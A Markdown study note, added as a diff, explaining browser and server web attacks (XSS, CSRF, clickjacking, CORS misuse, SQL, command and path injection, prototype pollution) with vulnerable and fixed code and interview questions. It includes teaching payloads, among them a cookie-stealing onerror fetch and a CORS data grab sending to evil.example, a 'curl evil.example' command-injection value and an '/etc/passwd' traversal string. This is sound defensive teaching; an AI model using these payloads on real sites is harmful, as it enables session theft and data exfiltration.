@@ -1,0 +1,702 @@
+---
+title: Web security — attacks, how they work, and how to stop them
+description: Same-origin policy, XSS, CSRF, clickjacking, iframe sandboxing, CORS mistakes, injection, cookies, CSP, and the headers that actually help — with vulnerable vs fixed code.
+slug: web-security
+date: 2026-08-18
+tags:
+  - javascript
+  - security
+  - browsers
+  - http
+  - interview
+---
+
+The browser is a machine that runs **other people’s code** next to **your user’s data**. A comment box, an ad iframe, a JSON API, a redirect URL — any of those can become an attack if the page trusts the wrong string.
+
+This note is a map of the attacks that show up in real web apps, **how they are built** (on a toy site you own, never on someone else’s), and **what to change** so they fail. Examples use `shop.example` (victim) and `evil.example` (attacker). Payloads are teaching sketches: they log a cookie or submit a form, they are not a kit.
+
+## The browser’s default: same origin
+
+### What an origin is
+
+An **origin** is scheme + host + port, together:
+
+```txt
+https://shop.example          → https, shop.example, 443
+https://shop.example:443      → same origin as above
+http://shop.example           → different (scheme)
+https://api.shop.example      → different (host)
+https://shop.example:8443     → different (port)
+```
+
+Two pages with the **same origin** can read each other’s DOM, cookies (for that site), `localStorage`, and usually talk to that origin’s HTTP APIs without extra CORS headers.
+
+Two pages with **different origins** cannot. That rule is the **same-origin policy**. Almost every “web attack” is a way to **borrow the user’s existing session** without breaking that policy — or a way to **trick your server** into treating attacker data as code.
+
+### What the policy does *not* block
+
+A page on `evil.example` **may**:
+
+- Load `https://shop.example/logo.png` as an image
+- Submit a form to `https://shop.example/logout` (the browser still sends cookies, unless you opted out)
+- Open `shop.example` in an iframe (unless you forbid it)
+- Navigate the user there with `location.href`
+
+It **may not** (by default):
+
+- Read the pixels of that image, the HTML of the iframe, or the JSON of `fetch("https://shop.example/me")`
+
+Attacks live in the gap: “I cannot *read* your page, but I can *make the user’s browser do something* as them.”
+
+## Cookies, sessions, and where secrets leak
+
+### How a session usually works
+
+The server sets a cookie after login. Every later request to that site includes it:
+
+```http
+Set-Cookie: sid=abc123; Path=/; HttpOnly; Secure; SameSite=Lax
+```
+
+| Flag | Why it exists |
+| --- | --- |
+| `HttpOnly` | JavaScript cannot read it (`document.cookie` skips it). Stops many XSS cookie-steals. |
+| `Secure` | Cookie only on HTTPS. Stops a café Wi-Fi from injecting `http://` and grabbing it. |
+| `SameSite=Lax` | Cookie is **not** sent on most cross-site POSTs. Cuts classic CSRF. `Strict` is tighter (also hides the cookie on cross-site *top-level* GET navigations). `None` needs `Secure` and is for cross-site iframes that *must* send a session. |
+| `Path` / `Domain` | Scope. A cookie for `.example` is sent to every subdomain — easy to over-share. |
+
+`localStorage` has **no** HttpOnly. Any XSS on the page can `localStorage.getItem("token")` and `fetch` it home. Prefer cookies with `HttpOnly` for session IDs, or short-lived tokens that never sit in JS-readable storage.
+
+### Session fixation (brief)
+
+If the app **keeps** the anonymous cookie after login, an attacker can plant `sid=known` first, then wait for the victim to log in. **Mitigate:** issue a **new** session id on every privilege change (login, password change, 2FA).
+
+## Cross-site scripting (XSS)
+
+XSS means **the attacker’s JavaScript runs as your origin**. Then they can act as the user: change the DOM, call your APIs, and — if the cookie is not `HttpOnly` — steal the session.
+
+There are three usual shapes. The payload is the same idea; only **where it is stored** changes.
+
+### Stored XSS
+
+The attacker saves HTML in your database (comment, display name, support ticket). Everyone who loads the page runs it.
+
+Vulnerable server (Express-shaped sketch):
+
+```js
+app.post("/comments", (req, res) => {
+  db.comments.push({ body: req.body.body }); // raw string, trusted later
+  res.redirect("/post");
+});
+
+app.get("/post", (req, res) => {
+  const html = db.comments.map((c) => `<p>${c.body}</p>`).join("");
+  res.send(`<!doctype html><body>${html}</body>`);
+});
+```
+
+What they submit (teaching payload):
+
+```html
+<img src="x" onerror="fetch('https://evil.example/steal?c='+encodeURIComponent(document.cookie))" />
+```
+
+If comments are concatenated into HTML, the browser parses the tag and runs `onerror`.
+
+### Reflected XSS
+
+The payload is **in the URL** (search box, error page). The server echoes it back in the response. The attacker sends the victim a link.
+
+```js
+app.get("/search", (req, res) => {
+  res.send(`<p>No results for ${req.query.q}</p>`);
+});
+```
+
+Link they send:
+
+```txt
+https://shop.example/search?q=<script>alert(1)</script>
+```
+
+Modern browsers’ XSS auditor is gone. Do not count on the browser to save a reflected echo.
+
+### DOM-based XSS
+
+The server HTML is fine. **Client** JavaScript takes a string from `location`, `postMessage`, or `innerHTML` of a widget and writes it as HTML.
+
+```js
+// Vulnerable: hash is attacker-controlled
+const name = decodeURIComponent(location.hash.slice(1));
+document.getElementById("hello").innerHTML = "Hi, " + name;
+```
+
+URL:
+
+```txt
+https://shop.example/welcome#<img src=x onerror=alert(1)>
+```
+
+`innerHTML` parses markup. `textContent` does not.
+
+### How attackers get the string in
+
+- A comment, username, or markdown field you render as HTML
+- Open-redirect + reflected query (`?next=` that you print)
+- A third-party script (analytics, chat widget) that is compromised
+- `javascript:` URLs in `href` if you do `element.href = userUrl`
+- `eval`, `new Function`, `setTimeout(string)` on user input
+
+### Mitigation
+
+**Treat every untrusted string as text, not HTML.**
+
+```jsx
+// React: default is text. This is safe.
+<p>{comment.body}</p>
+
+// Dangerous on purpose — only with a sanitizer you trust
+<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />
+```
+
+```js
+el.textContent = userName; // safe
+el.setAttribute("href", url); // still validate: only https: http:, never javascript:
+```
+
+Server-side: encode for the **context** you are in (HTML body vs attribute vs JS string vs URL). A library (`escape-html`, templating that auto-escapes) is better than hand-rolled `&lt;`.
+
+Also:
+
+- `HttpOnly` + `Secure` + `SameSite` on session cookies
+- **Content-Security-Policy** so a leaked `<script>` cannot load `evil.example` (see below)
+- Avoid `markdown` → HTML without a sanitizer; “safe markdown” still allows `javascript:` links unless you strip them
+- Never concatenate SQL/HTML/shell from the same string without encoding for that language
+
+## Cross-site request forgery (CSRF)
+
+The attacker **cannot read** your page. They **can** make the **user’s browser** send a request **to your origin**, with cookies attached (depending on `SameSite`).
+
+Classic setup: victim is logged into `shop.example`. They visit `evil.example`, which contains:
+
+```html
+<form action="https://shop.example/transfer" method="POST">
+  <input type="hidden" name="to" value="attacker" />
+  <input type="hidden" name="amount" value="500" />
+</form>
+<script>document.forms[0].submit();</script>
+```
+
+The browser POSTs to shop with the victim’s `sid` cookie. The transfer happens. The attacker never saw the cookie.
+
+`fetch` from `evil.example` to `shop.example` is blocked from **reading** the response (CORS), but a **simple form POST** does not need CORS. Images and `<form>` are the old CSRF vehicles. `SameSite=Lax` stops most of those POSTs from carrying the cookie.
+
+### Login CSRF
+
+A weaker cousin: the attacker logs **you** into **their** account (POST to `/login` with their password) so later activity is attributed to them. Mitigate with CSRF tokens on login too, or by rejecting cross-site POSTs.
+
+### Mitigation
+
+1. **`SameSite=Lax` or `Strict`** on session cookies (default in modern browsers if you omit SameSite, but **set it explicitly**).
+2. **CSRF token**: a random value in the session, echoed as a hidden field or header, checked on mutating requests.
+
+```html
+<form method="POST" action="/transfer">
+  <input type="hidden" name="_csrf" value="{{csrfToken}}" />
+  ...
+</form>
+```
+
+```js
+app.post("/transfer", (req, res) => {
+  if (req.body._csrf !== req.session.csrf) {
+    return res.status(403).end();
+  }
+  // ...
+});
+```
+
+3. For SPAs: custom header (`X-CSRF-Token` or `X-Requested-With`) plus cookie. Cross-origin pages cannot set that header on a “simple” request without a CORS preflight you do not allow.
+4. **Re-auth** for money, email, and password changes (password or WebAuthn), not only a cookie.
+5. GET must be **safe**. Never `GET /delete?id=1`. Prefetch and `<img>` will fire it.
+
+## Clickjacking and iframes
+
+An **iframe** is a nested browsing context: another document, often another origin, painted *inside* your page (or you painted inside theirs).
+
+### Clickjacking (UI redressing)
+
+`evil.example` puts `shop.example` in a full-viewport iframe, then overlays a fake “Play” button. Opacity of the iframe is `0` or `0.01`. The user thinks they click Play; they click **Confirm transfer** on the real shop UI.
+
+```html
+<style>
+  iframe {
+    position: fixed;
+    inset: 0;
+    width: 100%;
+    height: 100%;
+    opacity: 0.01;
+    z-index: 2;
+  }
+  .bait {
+    position: relative;
+    z-index: 1;
+    font-size: 2rem;
+  }
+</style>
+<button class="bait">Click to win a prize</button>
+<iframe src="https://shop.example/settings/delete-account"></iframe>
+```
+
+The framed page still has the user’s cookies (`SameSite=None` or a same-site embed). The click is real.
+
+### Mitigation: do not allow being framed
+
+**CSP (preferred):**
+
+```http
+Content-Security-Policy: frame-ancestors 'self'
+```
+
+Or `'none'` if you never need to be embedded. `frame-ancestors` is checked by the **browser of the framed page**. An attacker cannot override it from the parent.
+
+**Legacy header:**
+
+```http
+X-Frame-Options: DENY
+```
+
+`SAMEORIGIN` allows same-origin frames. Do not use `ALLOW-FROM` (obsolete). If both CSP and `X-Frame-Options` exist, modern browsers honor CSP `frame-ancestors`.
+
+**Do not** rely on `if (top !== self) top.location = self.location` (framebusting). Attackers sandbox the iframe so that script cannot touch `top`.
+
+### Embedding *other* sites: `sandbox`
+
+When **you** iframe untrusted HTML (user previews, ads, HTML email), assume the child wants to escape.
+
+```html
+<iframe
+  src="https://untrusted.example/widget"
+  sandbox="allow-scripts"
+  referrerpolicy="no-referrer"
+></iframe>
+```
+
+With `sandbox` and **no tokens**, the iframe is treated as a unique origin: no cookies of yours, no `top` navigation, no forms, no popups, no pointer lock.
+
+| Token | What it re-enables (danger) |
+| --- | --- |
+| `allow-scripts` | JS in the child (still a unique origin unless `allow-same-origin`) |
+| `allow-same-origin` | Child keeps its real origin — **cookies**. Combined with `allow-scripts`, the child can attack that origin. |
+| `allow-forms` | Submit forms |
+| `allow-popups` | `window.open` |
+| `allow-top-navigation` | Navigate the **parent** tab (phishing) |
+| `allow-top-navigation-by-user-activation` | Same, only after a click |
+| `allow-modals` | `alert` |
+
+**Never** set `allow-scripts` **and** `allow-same-origin` on a frame that loads **your** origin with attacker-controlled HTML. That is XSS with extra steps.
+
+### `allow` and permissions policy
+
+Iframes can request camera, mic, payment, fullscreen:
+
+```html
+<iframe src="https://other.example" allow="camera 'none'; microphone 'none'; fullscreen 'src'"></iframe>
+```
+
+Lock this down. A third-party chat widget does not need `payment`.
+
+### `postMessage` — the iframe API people get wrong
+
+Cross-origin frames talk with `postMessage`. The bug is **not checking `event.origin`**.
+
+Attacker iframe (or popup):
+
+```js
+parent.postMessage({ type: "setEmail", email: "attacker@evil.example" }, "*");
+```
+
+Vulnerable parent:
+
+```js
+window.addEventListener("message", (event) => {
+  // anyone can send this
+  if (event.data?.type === "setEmail") {
+    saveEmail(event.data.email);
+  }
+});
+```
+
+Fixed:
+
+```js
+window.addEventListener("message", (event) => {
+  if (event.origin !== "https://widget.example") return;
+  if (event.data?.type !== "setEmail") return;
+  if (typeof event.data.email !== "string") return;
+  saveEmail(event.data.email);
+});
+```
+
+When **sending**, name the target origin. Never `*` if the payload is sensitive:
+
+```js
+frame.contentWindow.postMessage({ token }, "https://widget.example");
+```
+
+### Cookies in third-party iframes
+
+Chrome and others restrict **third-party cookies**. A widget on `cdn.vendor.example` inside `shop.example` often **cannot** read `vendor`’s session cookie. Vendors moved to first-party tokens and Storage Access API. If you build an embeddable widget, design for **no third-party cookie**.
+
+### Tabnabbing (`target="_blank"`)
+
+```html
+<a href="https://evil.example" target="_blank">docs</a>
+```
+
+The opened page can do `window.opener.location = "https://evil.example/phish"`. The original tab changes under the user.
+
+```html
+<a href="https://other.example" target="_blank" rel="noopener noreferrer">docs</a>
+```
+
+Modern browsers default `rel=noopener` for `target=_blank` in many cases. **Still set it.** `noreferrer` also strips `Referer`.
+
+## CORS is not a lock — it is a hole you cut
+
+Browsers **block JS** on `evil.example` from **reading** `https://shop.example/api/me`. Your API can **opt in** with CORS headers.
+
+```http
+Access-Control-Allow-Origin: https://app.shop.example
+Access-Control-Allow-Credentials: true
+```
+
+### How a misconfiguration is abused
+
+```js
+// Server: “be friendly”
+res.setHeader("Access-Control-Allow-Origin", "*");
+res.setHeader("Access-Control-Allow-Credentials", "true");
+```
+
+This combo is **invalid** (`*` + credentials). Some stacks still reflect the request `Origin`:
+
+```js
+res.setHeader("Access-Control-Allow-Origin", req.headers.origin); // any site
+res.setHeader("Access-Control-Allow-Credentials", "true");
+```
+
+Then `evil.example` can:
+
+```js
+fetch("https://shop.example/api/me", { credentials: "include" })
+  .then((r) => r.json())
+  .then((me) => fetch("https://evil.example/p", { method: "POST", body: JSON.stringify(me) }));
+```
+
+The browser sends the victim’s cookies **and** hands the JSON to attacker JS.
+
+### Mitigation
+
+- Allowlist **exact** origins. Never reflect `Origin` unless it matches a set.
+- If the API is cookie-authenticated, **do not** use `*`.
+- Do not put secrets in responses that you CORS-open to the world; use a public, unauthenticated shape instead.
+- Preflight (`OPTIONS`) must not be skipped for `Authorization` / custom headers unless you intend every origin to call you.
+
+CORS does **not** protect a server from curl, Postman, or a malicious app. Those do not enforce SOP. **AuthZ on the server** is still required.
+
+## Open redirects and header injection
+
+### Open redirect
+
+```js
+app.get("/out", (req, res) => {
+  res.redirect(req.query.next); // next=https://evil.example/login-lookalike
+});
+```
+
+Phish: `https://shop.example/out?next=https://evil.example`. The address bar showed your domain first.
+
+**Mitigate:** only redirect to **relative paths** you allow (`/account`, `/cart`), or to an allowlist of hosts. Parse with `new URL(next, base)` and check `url.origin`.
+
+### `javascript:` and `data:` URLs
+
+If you assign user input to `location` or `href`, allow only `http:` and `https:`:
+
+```js
+function safeHttpUrl(raw) {
+  const u = new URL(raw, "https://shop.example");
+  if (u.protocol !== "http:" && u.protocol !== "https:") throw new Error("bad url");
+  return u.href;
+}
+```
+
+### Response splitting (CRLF)
+
+If you put user input in a header without stripping `\r\n`, an attacker can add headers or a second response. Use frameworks that reject illegal header values; never `res.setHeader("Location", userString)` without validation.
+
+## Injection: SQL, NoSQL, command, path
+
+XSS injects **browser** languages. These inject **server** languages. The pattern is identical: untrusted string concatenated into a grammar.
+
+### SQL injection
+
+```js
+// Vulnerable
+db.query(`SELECT * FROM users WHERE email = '${req.body.email}'`);
+```
+
+Payload in `email`:
+
+```txt
+' OR 1=1 --
+```
+
+The query becomes “all users.” A heavier payload can `UNION SELECT` passwords.
+
+```js
+db.query("SELECT * FROM users WHERE email = $1", [req.body.email]);
+```
+
+ORMs with bound parameters are the default fix. Never build SQL with string templates from request bodies.
+
+### NoSQL / Mongo-shaped injection
+
+```js
+User.findOne({ email: req.body.email, password: req.body.password });
+```
+
+If `email` is `{ "$gt": "" }`, the operator may match the first user. **Mitigate:** ensure body fields are strings (`typeof email === "string"`), or use a schema validator (Zod, joi) before the query.
+
+### Command injection
+
+```js
+exec(`convert ${req.query.file} out.png`);
+```
+
+`file` = `x.png; curl evil.example`. **Mitigate:** never `exec` user strings. Use `execFile` with an argv array, or a library that does not spawn a shell.
+
+### Path traversal
+
+```js
+res.sendFile(path.join("/var/data", req.query.name));
+```
+
+`name` = `../../etc/passwd`. **Mitigate:**
+
+```js
+const root = "/var/data";
+const resolved = path.resolve(root, req.query.name);
+if (!resolved.startsWith(root + path.sep) && resolved !== root) {
+  return res.status(400).end();
+}
+```
+
+Prefer storing files under random ids, not user-supplied names.
+
+## Prototype pollution (JavaScript)
+
+Many apps merge JSON into objects:
+
+```js
+function merge(a, b) {
+  for (const k of Object.keys(b)) {
+    if (b[k] && typeof b[k] === "object") merge(a[k] ??= {}, b[k]);
+    else a[k] = b[k];
+  }
+}
+
+merge({}, JSON.parse('{"__proto__":{"isAdmin":true}}'));
+```
+
+After a polluted `Object.prototype`, `({}).isAdmin` may be `true`. Gadgets in lodash `defaultsDeep`, `jquery.extend`, and similar have been real CVEs.
+
+**Mitigate:** refuse keys `__proto__`, `constructor`, `prototype`; use `Object.create(null)`; keep merge libraries updated; do not `JSON.parse` into a merge that walks prototypes.
+
+## Mixed content and supply chain in the browser
+
+### Mixed content
+
+Page is `https://shop.example` but script is `http://cdn.example/app.js`. An attacker on the network **replaces the script**. Browsers block active mixed content. Serve **everything** HTTPS. Use HSTS:
+
+```http
+Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
+```
+
+### Subresource Integrity (SRI)
+
+If you load a CDN script, pin the hash so a hijacked CDN cannot change bytes:
+
+```html
+<script
+  src="https://cdn.example/lib.js"
+  integrity="sha384-...."
+  crossorigin="anonymous"
+></script>
+```
+
+### `eval` and JSONP
+
+JSONP is `<script src="https://api.example/x?callback=foo">` — the response is **JavaScript**, not JSON. Anyone who can change that URL runs code as you. Do not add JSONP in 2026. Use CORS + JSON.
+
+## Content Security Policy (CSP)
+
+CSP is a **second line** after encoding. It tells the browser which script, style, frame, and connect targets are allowed.
+
+A strict starting point for a static site:
+
+```http
+Content-Security-Policy:
+  default-src 'self';
+  script-src 'self';
+  style-src 'self';
+  img-src 'self' data:;
+  font-src 'self';
+  connect-src 'self';
+  frame-ancestors 'self';
+  base-uri 'self';
+  form-action 'self';
+  object-src 'none';
+  upgrade-insecure-requests
+```
+
+`script-src 'self'` blocks inline `<script>` and `onerror=` handlers **unless** you also allow `'unsafe-inline'` (which guts XSS protection). Prefer **hashes** or **nonces** for the few inline scripts you need:
+
+```html
+<script nonce="randomPerResponse">window.__BOOT = ...</script>
+```
+
+```http
+Content-Security-Policy: script-src 'self' 'nonce-randomPerResponse'
+```
+
+`object-src 'none'` kills old plugin vectors (`<object>`, Flash). `base-uri 'self'` stops `<base href="https://evil.example">` from rewriting relative URLs.
+
+Report-only while you tune:
+
+```http
+Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
+```
+
+## Other headers worth setting
+
+```http
+X-Content-Type-Options: nosniff
+Referrer-Policy: strict-origin-when-cross-origin
+Permissions-Policy: camera=(), microphone=(), geolocation=()
+Cross-Origin-Opener-Policy: same-origin
+Cross-Origin-Resource-Policy: same-origin
+```
+
+| Header | Job |
+| --- | --- |
+| `nosniff` | Do not guess HTML as JS or vice versa (stops some XSS via uploaded files). |
+| `Referrer-Policy` | Stop leaking `?token=` URLs to other origins. |
+| `Permissions-Policy` | Disable powerful APIs you do not use. |
+| `COOP` | Isolate your window from `window.opener` cross-origin (helps Spectre-class process isolation). |
+| `CORP` | Other origins cannot embed this response as a resource unless you allow it. |
+
+Set `Content-Type` correctly on APIs (`application/json`). A JSON document served as `text/html` can become XSS if the body contains `<script>`.
+
+## Authorization bugs the browser will not catch
+
+SOP and CSP do not notice **insecure direct object references**:
+
+```js
+app.get("/invoices/:id", requireUser, async (req, res) => {
+  const inv = await db.invoice.find(req.params.id);
+  res.json(inv); // any logged-in user who guesses ids
+});
+```
+
+**Mitigate:** `WHERE id = $1 AND owner_id = $2`. Check permission **after** load, every time. UUIDs reduce guessing; they are not access control.
+
+Mass assignment: `User.update(req.body)` with `role: "admin"` in the JSON. Pick an allowlist of fields.
+
+## A short attacker playbook (defensive reading)
+
+On a **site you are paid to test**, people often walk this list. Use it as a **review checklist**, not a recipe for other people’s apps.
+
+1. Where does user text become HTML or `innerHTML`? (XSS)
+2. Can I iframe sensitive pages? (clickjacking)
+3. Do mutating endpoints accept cross-site POSTs with cookies? (CSRF)
+4. Does CORS reflect `Origin` with credentials? (data theft)
+5. Do redirects take a free URL? (phishing)
+6. Are queries parameterized? (injection)
+7. Are files opened with `..`? (traversal)
+8. Do `message` handlers check `origin`? (iframe / popup XSS)
+9. Is the session in `localStorage`? (XSS → account takeover)
+10. Can I upload HTML/SVG and have it served as `text/html` from your origin?
+
+## What to do in a React / Vite app
+
+- Default JSX encoding is your friend. Audit every `dangerouslySetInnerHTML`, `href={user}`, and `markdown` renderer.
+- Put the session in an `HttpOnly` cookie; send it with `credentials: "include"` only to your API origin.
+- Set security headers in the host (Netlify `_headers`, nginx, or the framework adapter) — SPAs do not set `frame-ancestors` from client JS in a way that blocks clickjacking of the first document.
+- Sanitize HTML with DOMPurify if you must render rich text; keep a CSP that forbids `unsafe-inline` as much as you can.
+- Treat `postMessage`, service workers, and webviews as extra origins with the same rules.
+
+## Interview questions
+
+<details>
+<summary>What is an origin, and what does the same-origin policy actually stop?</summary>
+
+Scheme + host + port. It stops a page from <em>reading</em> another origin’s DOM, storage, and (by default) fetch responses. It does not stop loading images, submitting forms, or framing — those need other controls (SameSite, CSP <code>frame-ancestors</code>, CORS).
+
+</details>
+
+<details>
+<summary>Stored vs reflected vs DOM XSS?</summary>
+
+Stored: payload sits in your DB and runs for every viewer. Reflected: payload is in the request and echoed in that response. DOM: the server HTML is clean; client JS writes the payload into the DOM as HTML. Fix all three by encoding/textContent and CSP; sanitizers only when you truly need HTML.
+
+</details>
+
+<details>
+<summary>Why does HttpOnly not stop XSS from transferring money?</summary>
+
+HttpOnly hides the cookie from `document.cookie`. The attacker’s script still runs as the user and can `fetch('/transfer', { credentials: 'include' })`. XSS is still account takeover. HttpOnly just blocks the “exfiltrate the cookie to another machine” shortcut.
+
+</details>
+
+<details>
+<summary>How does CSRF differ from XSS?</summary>
+
+XSS runs JS on your origin. CSRF makes the victim’s browser send an authenticated request without running JS on your origin. CSRF dies with SameSite cookies + tokens; XSS needs encoding, sanitization, and CSP.
+
+</details>
+
+<details>
+<summary>Why is <code>Access-Control-Allow-Origin: *</code> with cookies a problem — and what do browsers do?</summary>
+
+Browsers refuse <code>*</code> together with <code>Access-Control-Allow-Credentials: true</code>. The dangerous bug is <em>reflecting</em> any <code>Origin</code> while allowing credentials, which lets <code>evil.example</code> read JSON with the user’s cookies.
+
+</details>
+
+<details>
+<summary>How do you stop clickjacking? Why is framebusting JS a bad primary defense?</summary>
+
+<code>Content-Security-Policy: frame-ancestors 'none'</code> (or <code>'self'</code>) and/or <code>X-Frame-Options: DENY</code>. Framebusting can be disabled with <code>sandbox</code> on the attacking iframe, so the child script cannot touch <code>top</code>.
+
+</details>
+
+<details>
+<summary>What is dangerous about <code>sandbox="allow-scripts allow-same-origin"</code>?</summary>
+
+Scripts run with the iframe’s real origin, so attacker HTML you hosted can use that origin’s cookies and DOM — equivalent to XSS. Use sandbox without <code>allow-same-origin</code> for untrusted HTML, or a separate throwaway origin.
+
+</details>
+
+<details>
+<summary>How do you validate <code>postMessage</code>?</summary>
+
+Check <code>event.origin</code> against an allowlist, check the shape of <code>event.data</code>, and when sending, pass a concrete target origin instead of <code>"*"</code> if the data is sensitive.
+
+</details>
+
+<details>
+<summary>Why are parameterized queries not optional?</summary>
+
+SQL (and shell, and LDAP) are languages. Concatenation lets the attacker close a string and write a new statement. Parameters send data out-of-band so it cannot change grammar.
+
+</details>
